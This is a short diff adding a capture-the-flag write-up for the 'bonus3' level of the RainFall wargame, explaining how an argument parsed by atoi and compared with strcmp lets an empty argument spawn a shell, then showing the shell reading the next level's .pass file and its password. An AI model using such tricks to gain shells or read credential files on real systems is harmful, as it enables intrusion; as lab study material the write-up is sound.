@@ -1,0 +1,13 @@
+the program read the .pass file for next level into buffer B,
+the program requires argv A to be given (only one, otherwise it exits)
+program calls atoi() with argv A as a parameter and the resulting int is used as an index for buffer B, at that index the program inserts a null byte
+then the program compares the buffer B to argv A via strcmp and if they match it executes /bin/sh
+seems like the only way to pass this level is to provide the program with a null byte as an argv[1] parameter
+
+bonus3@RainFall:/tmp$ /home/user/bonus3/bonus3 $'\0'
+$ whoami        
+end
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+$ 
+bonus3@RainFall:/tmp$ 
